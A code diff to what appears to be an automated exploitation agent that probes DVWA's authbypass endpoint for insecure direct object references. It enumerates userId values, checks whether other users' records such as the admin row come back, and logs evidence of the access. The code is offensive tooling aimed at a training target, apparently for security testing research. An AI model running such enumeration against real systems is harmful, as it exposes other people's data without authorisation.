@@ -3,6 +3,8 @@
 from __future__ import annotations
 
 import logging
+import json
+import re
 from typing import Any
 
 from agents.agent_telemetry import exploit_event, probe_event, score_event
@@ -10,11 +12,12 @@ from agents.state_utils import already_tried_payloads, candidate_payloads_for_st
 from core.state import ExploitationState, MODULE_TO_KG_NODE
 from foundation.session_manager import DVWASession
 from foundation.verifier import Verifier
+from agents.access_control.session import open_access_control_session, permission_evidence_fields, user_object_id
 
 logger = logging.getLogger(__name__)
 
 AGENT_ID = "ac_idor"
-MODULE_PATH = "/vulnerabilities/authbypass/"
+MODULE_PATH = "/vulnerabilities/authbypass/get_user_data.php"
 _PROBE_OBSERVATION_KEY = "object_ids_enumerable"
 
 # Signals indicating the response contains user-specific data
@@ -23,6 +26,26 @@ _DATA_SIGNALS = [
     "first name", "surname", "user id",
     "password",
 ]
+
+
+def _contains_target_record(body: str, user_id: str) -> bool:
+    """Require the requested user record, rather than generic page visibility."""
+    try:
+        decoded = json.loads(body)
+    except (TypeError, ValueError):
+        decoded = None
+    rows = decoded if isinstance(decoded, list) else [decoded] if isinstance(decoded, dict) else []
+    for row in rows:
+        if not isinstance(row, dict):
+            continue
+        identifier = next((str(row[key]) for key in ("user_id", "userId", "id") if row.get(key) is not None), None)
+        text = " ".join(str(value) for value in row.values()).lower()
+        if identifier == str(user_id) and (user_id != "1" or "admin" in text):
+            return True
+    # Some DVWA fixture variants return the row in HTML rather than JSON.
+    if user_id == "1" and re.search(r"(?:user\s*id|user_id|id)\s*[:=\" ]+1\b.{0,160}\badmin\b|\badmin\b.{0,160}(?:user\s*id|user_id|id)\s*[:=\" ]+1\b", body, re.I | re.S):
+        return True
+    return False
 
 
 def _probe_preconditions(
@@ -37,18 +60,6 @@ def _probe_preconditions(
     events: list[dict] = []
     verifier = Verifier()
 
-    # Get baseline response for user ID 1 (the admin user)
-    baseline_text = ""
-    baseline_len = 0
-    try:
-        baseline_resp = session.get(MODULE_PATH, params={"userId": "1", "Submit": "Submit"})
-        baseline_text = baseline_resp.text
-        baseline_len = len(baseline_text)
-    except Exception as exc:
-        logger.warning("[%s] PROBE baseline request failed: %s", AGENT_ID, exc)
-        # Baseline failed — still attempt probes and compare them against each other
-        baseline_text = ""
-
     sent_any = False
     responses: list[tuple[str, str, int]] = []  # (payload, text, length)
     for payload in payloads:
@@ -60,29 +71,19 @@ def _probe_preconditions(
             if test_id == "1":
                 continue
             tried.append(payload)
-            resp = session.get(MODULE_PATH, params={"userId": test_id, "Submit": "Submit"})
-            events.append(probe_event(AGENT_ID, f"userId={test_id}", resp.status_code, False, response=resp))
+            resp = session.get(MODULE_PATH, params={"userId": test_id})
+            events.append(probe_event(AGENT_ID, f"userId={test_id}", resp.status_code, False,
+                endpoint=MODULE_PATH, response=resp))
+            events[-1]["payload"].update(permission_evidence_fields(session, session._principal_id,
+                session._initial_session_fingerprint, object_id=user_object_id(test_id)))
             if resp.status_code == 200:
                 responses.append((test_id, resp.text, len(resp.text)))
-                resp_signals = verifier.contains_any(resp.text, _DATA_SIGNALS)
-                # IDOR detected if different user data is returned
-                if baseline_text:
-                    if resp_signals.ok and len(resp.text) != baseline_len:
-                        events[-1]["payload"].update(signal_detected=True, verified_grade=1, verification_reason="verified_probe_precondition")
-                        observations[_PROBE_OBSERVATION_KEY] = True
-                        return True, tried, observations, events
-                    if resp.text != baseline_text and len(resp.text) > 100:
-                        events[-1]["payload"].update(signal_detected=True, verified_grade=1, verification_reason="verified_probe_precondition")
-                        observations[_PROBE_OBSERVATION_KEY] = True
-                        return True, tried, observations, events
-                else:
-                    # No baseline — compare against other responses
-                    if len(responses) >= 2:
-                        first_text = responses[0][1]
-                        if resp.text != first_text and resp_signals.ok:
-                            events[-1]["payload"].update(signal_detected=True, verified_grade=1, verification_reason="verified_probe_precondition")
-                            observations[_PROBE_OBSERVATION_KEY] = True
-                            return True, tried, observations, events
+                records_visible = bool(_parse_records(resp.text))
+                if records_visible or verifier.contains_any(resp.text, _DATA_SIGNALS).ok:
+                    events[-1]["payload"].update(signal_detected=True, verified_grade=1,
+                        verification_reason="verified_probe_precondition")
+                    observations[_PROBE_OBSERVATION_KEY] = True
+                    return True, tried, observations, events
         except Exception as exc:
             logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
             events.append(probe_event(AGENT_ID, f"userId={payload}", None, False))
@@ -103,30 +104,25 @@ def _attempt_exploit(
     score = 0
     verifier = Verifier()
 
-    # Fetch baseline for differential comparison
-    baseline_text = ""
-    try:
-        baseline_resp = session.get(MODULE_PATH, params={"userId": "1", "Submit": "Submit"})
-        baseline_text = baseline_resp.text
-    except Exception as exc:
-        logger.warning("[%s] EXPLOIT baseline request failed: %s", AGENT_ID, exc)
-
     for payload in payloads:
         if payload in already_tried:
             continue
         tried.append(payload)
         try:
             test_id = payload.strip()
-            resp = session.get(MODULE_PATH, params={"userId": test_id, "Submit": "Submit"})
-            events.append(exploit_event(AGENT_ID, f"userId={test_id}", resp.status_code, True, response=resp))
-            if resp.status_code == 200:
-                result = verifier.contains_any(resp.text, _DATA_SIGNALS)
-                # Require response to differ from baseline to confirm IDOR
-                if result.ok and resp.text != baseline_text:
-                    events[-1]["payload"].update(verified_grade=2, verification_reason="visibility_without_permission_oracle")
-                    score = max(score, 3)
-                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
-                    break
+            resp = session.get(MODULE_PATH, params={"userId": test_id})
+            visible = resp.status_code == 200 and _contains_target_record(resp.text, test_id)
+            events.append(exploit_event(AGENT_ID, f"userId={test_id}", resp.status_code, visible,
+                endpoint=MODULE_PATH, response=resp))
+            events[-1]["payload"].update(permission_evidence_fields(session, session._principal_id,
+                session._initial_session_fingerprint, object_id=user_object_id(test_id),
+                consumed_source_evidence_id=getattr(session, "_consumed_source_evidence_id", None)))
+            if visible:
+                events[-1]["payload"].update(signal_detected=True, verified_grade=3,
+                    verification_reason="verified_permission_candidate")
+                score = max(score, 3)
+                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
+                break
         except Exception as exc:
             logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
             events.append(exploit_event(AGENT_ID, f"userId={payload}", None, False))
@@ -155,14 +151,13 @@ def ac_idor_agent(state: ExploitationState) -> dict[str, Any]:
     if not target_url:
         return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])
 
-    session = DVWASession(target_url)
+    session = None
     try:
-        if not session.login():
-            return make_update(
-                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
-                failure_agents=[AGENT_ID],
-            )
-        session.set_security_level(security_level)
+        session, principal, initial_fingerprint, consumed_source_evidence_id = open_access_control_session(
+            state, AGENT_ID, security_level)
+        session._principal_id = principal
+        session._initial_session_fingerprint = initial_fingerprint
+        session._consumed_source_evidence_id = consumed_source_evidence_id
 
         already_tried = already_tried_payloads(state, AGENT_ID)
         confirmed_vulns: list[str] = []
@@ -227,4 +222,13 @@ def ac_idor_agent(state: ExploitationState) -> dict[str, Any]:
             failure_agents=[AGENT_ID],
         )
     finally:
-        session.close()
+        if session is not None:
+            session.close()
+
+
+def _parse_records(body: str) -> list[dict]:
+    try:
+        rows = json.loads(body)
+    except (TypeError, ValueError):
+        return []
+    return [row for row in rows if isinstance(row, dict)] if isinstance(rows, list) else []
